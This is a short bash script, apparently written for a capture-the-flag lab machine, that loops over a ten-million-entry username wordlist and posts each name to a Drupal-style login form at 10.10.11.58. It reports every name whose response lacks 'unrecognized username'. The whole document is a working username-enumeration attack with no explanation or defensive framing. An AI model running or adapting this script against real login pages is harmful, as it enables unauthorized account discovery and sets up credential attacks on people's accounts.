#!/bin/bash




cat /opt/SecLists/Usernames/xato-net-10-million-usernames.txt |  while read line; do response=$(curl -s -X POST "http://10.10.11.58/?q=user/login" -d "name=$line&pass=sddede&form_build_id=form-s5x1p5dkV_oNQMhHJlWmGokmVRJBEsHSr1FfDd0mQrU&form_id=user_login&op=Log+in" | html2text)



	if ! echo "$response" | grep -q "unrecognized username"; then
		echo "valid username found $line"
		echo "$response"
	fi
done
